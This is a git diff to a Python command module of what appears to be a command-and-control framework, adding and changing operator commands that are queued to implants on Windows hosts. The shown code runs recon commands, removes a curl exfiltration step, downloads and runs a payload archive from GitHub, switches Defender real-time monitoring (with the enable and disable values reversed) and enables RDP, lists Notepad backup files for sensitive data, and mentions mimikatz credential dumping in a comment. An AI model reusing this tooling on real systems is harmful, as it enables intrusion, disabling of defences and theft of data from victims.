@@ -4,41 +4,6 @@ import time
 
 
 ######################################
-# 1. Enhanced Ping Host with Automation
-######################################
-class EnhancedPingHost(BaseCommand):
-    command_name = "ping_host"
-    command_help = (
-        "\tUsage: `ping_host` <host ip/hostname>\n"
-        "\tPings a host and, if successful, gathers additional system info.\n"
-        "\tChained recon commands (whoami, hostname) are enqueued if the host is alive."
-    )
-
-    def __init__(self, command, args_list, agent_id):
-        super().__init__(command, args_list, agent_id)
-        if not args_list:
-            raise ValueError("Usage: ping_host <host ip/hostname>")
-        self.host = args_list[0]
-        self.agent_class = BaseAgent(agent_id)
-
-    def run(self):
-        ping_cmd = f"shell ping {self.host}"
-        ping_id = self.agent_class.enqueue_command(ping_cmd)
-        time.sleep(1)
-        ping_response = self.agent_class.get_one_command_and_response(ping_id).get(
-            "response", ""
-        )
-        if "Reply from" in ping_response:
-            print("Ping successful. Proceeding with additional recon.")
-            for cmd in ["shell whoami", "shell hostname"]:
-                self.agent_class.enqueue_command(cmd)
-            ping_response += "\nHost is alive. Additional system info queued."
-            self.agent_class.store_response(ping_id, ping_response)
-        else:
-            print("Ping failed or no response.")
-
-
-######################################
 # 2. System Recon (Multi-step)
 ######################################
 class SystemRecon(BaseCommand):
@@ -46,64 +11,34 @@ class SystemRecon(BaseCommand):
     command_help = (
         "\tUsage: `system_recon` [exfiltration_url] [temp_filepath]\n"
         "\tAggregates system information and network connections.\n"
-        "\tOptionally exfiltrates data if an exfiltration URL is provided (default temp file: C:\\temp\\sys_recon.txt)."
     )
 
     def __init__(self, command, args_list, agent_id):
         super().__init__(command, args_list, agent_id)
-        self.exfil_url = args_list[0] if len(args_list) > 0 else None
-        self.temp_filepath = (
-            args_list[1] if len(args_list) > 1 else "C:\\temp\\sys_recon.txt"
-        )
         self.agent_class = BaseAgent(agent_id)
 
+        self.command_ids = []
+
+    # this is how we are gonna do it
     def run(self):
-        recon_data = ""
-        cmds = [
-            ("OS Version", "shell ver"),
-            ("Current User", "shell whoami"),
-            ("Hostname", "shell hostname"),
-        ]
-        for label, cmd in cmds:
-            cmd_id = self.agent_class.enqueue_command(cmd)
-            time.sleep(1)
-            response = self.agent_class.get_one_command_and_response(cmd_id).get(
-                "response", ""
-            )
-            recon_data += f"{label}:\n{response}\n\n"
-
-        netstat_cmd = "start_process netstat -ano"
-        netstat_id = self.agent_class.enqueue_command(netstat_cmd)
-        time.sleep(2)
-        netstat_resp = self.agent_class.get_one_command_and_response(netstat_id).get(
-            "response", ""
-        )
-        recon_data += f"Netstat:\n{netstat_resp}\n\n"
-
-        write_cmd = f"write_file {self.temp_filepath} {recon_data}"
-        write_id = self.agent_class.enqueue_command(write_cmd)
         time.sleep(1)
-        write_resp = self.agent_class.get_one_command_and_response(write_id).get(
-            "response", ""
-        )
-        if "error" in write_resp.lower():
-            print("Failed to write recon data:", write_resp)
-        else:
-            print("Recon data saved locally.")
-            self.agent_class.store_response(write_id, write_resp)
+        # list of commands to run
+        cmds = {
+            "shell ver": "system.os",
+            "shell whoami": "system.username",
+            "shell hostname": "system.hostname",
+            "shell powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ', '\"": "network.internal_ip",
+            'shell powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"': "network.domain",
+            'shell powershell -c "(Get-NetIPConfiguration | Where-Object IPv4DefaultGateway).IPv4DefaultGateway.NextHop"': "network.external_ip",
+        }
 
-        if self.exfil_url:
-            exfil_cmd = f"shell curl -F 'file=@{self.temp_filepath}' {self.exfil_url}"
-            exfil_id = self.agent_class.enqueue_command(exfil_cmd)
-            time.sleep(2)
-            exfil_resp = self.agent_class.get_one_command_and_response(exfil_id).get(
-                "response", ""
-            )
-            if "error" in exfil_resp.lower():
-                print("Exfiltration may have failed:", exfil_resp)
-            else:
-                print("Exfiltration successful.")
-                self.agent_class.store_response(exfil_id, exfil_resp)
+        for cmd, location in cmds.items():
+            self.agent_class.store_command_response_on_callback(cmd, location)
+            command_ids = self.agent_class.enqueue_command(cmd)
+            self.command_ids.append(command_ids)
+
+        # must return list of command ID's that were queued.
+        # return self.command_ids
 
 
 ######################################
@@ -551,3 +486,130 @@ class ScheduledTaskPingPersistence(BaseCommand):
 #         else:
 #             print("Credential dumping executed. Check stored output for credentials.")
 #             self.agent_class.store_response(mimikatz_id, mimikatz_resp)
+
+
+######################################
+# 9. Fun - DesktopGoose
+######################################
+class DesktopGoose(BaseCommand):
+    command_name = "goose"
+    command_help = "\tUsage: `goose`\n" "\tDownloads & runs desktop goose\n"
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        # self.target_host = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            make_temp = "shell mkdir C:\Temp"
+            download_goose = "shell powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ryanq47/DakotaConquestPayloads/archive/refs/heads/main.zip' -OutFile 'C:\Temp\\archive.zip'; Expand-Archive -Path 'C:\Temp\\archive.zip' -DestinationPath 'C:\Temp'; rm C:\Temp\\archive.zip; mv C:\Temp\DakotaConquestPayloads-main C:\Temp\somefolder\""
+            remove_1 = "shell powershell -c 'rm C:\Temp\somefolder\Linux -r'"
+            remove_2 = "shell powershell -c 'rm C:\Temp\somefolder\Python -r'"
+            remove_3 = "shell powershell -c 'rm C:\Temp\somefolder\Windows -r'"
+
+            run_goose = "shell C:\Temp\somefolder\goose\GooseDesktop.exe"
+
+            # Enqueue the command to create the task
+            self.agent_class.enqueue_command(make_temp)
+            self.agent_class.enqueue_command("execution_mode sync")
+            self.agent_class.enqueue_command(download_goose)
+            self.agent_class.enqueue_command("execution_mode async")
+            self.agent_class.enqueue_command(remove_1)
+            self.agent_class.enqueue_command(remove_2)
+            self.agent_class.enqueue_command(remove_3)
+            self.agent_class.enqueue_command(run_goose)
+
+        except Exception as e:
+            print("ScheduledTaskPingPersistence encountered an error:", e)
+
+
+######################################
+# 10. Defender
+######################################
+class Defender(BaseCommand):
+    command_name = "defender"
+    command_help = (
+        "\tUsage: `defender <arg>`\n"
+        "\tModify defender, valid args are: `enable`, `disable`\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.defender_on_off_arg = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            if self.defender_on_off_arg == "enable":
+                enable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true'
+                self.agent_class.enqueue_command(enable_command)
+
+            elif self.defender_on_off_arg == "disable":
+                disable_command = 'shell powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false'
+                self.agent_class.enqueue_command(disable_command)
+
+        except Exception as e:
+            print("Defender encountered an error:", e)
+
+
+######################################
+# 10. RDP - On/Off
+######################################
+class RDP(BaseCommand):
+    command_name = "rdp"
+    command_help = (
+        "\tUsage: `rdp <arg>`\n" "\tModify rdp, valid args are: `enable`, `disable`\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.defender_on_off_arg = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            if self.defender_on_off_arg == "enable":
+                enable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
+                self.agent_class.enqueue_command(enable_rdp)
+
+            elif self.defender_on_off_arg == "disable":
+                disable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
+                self.agent_class.enqueue_command(disable_rdp)
+
+        except Exception as e:
+            print("RDP encountered an error:", e)
+
+
+######################################
+# 10. Ops - Dump Notepad
+######################################
+class DumpNotepad(BaseCommand):
+    command_name = "dump_notepad"
+    command_help = (
+        "\tUsage: `dump_notepad`\n"
+        "\tDumps notepad backups, which may hold sensitive info\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        notepad_dir = "C:\\Users\\ryan\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
+        try:
+            list_backup_files_command = (
+                f"shell powershell -c 'ls {notepad_dir} -File -Name'"
+            )
+
+            # execute now
+            id = self.agent_class.enqueue_command(list_backup_files_command)
+            while self.agent_class.get_one_command_and_response(id) == None:
+                print("waiting on response")
+                time.sleep(0.5)
+
+            print("DONE")
+            print(self.agent_class.get_one_command_and_response(id))
+
+        except Exception as e:
+            print("RDP encountered an error:", e)
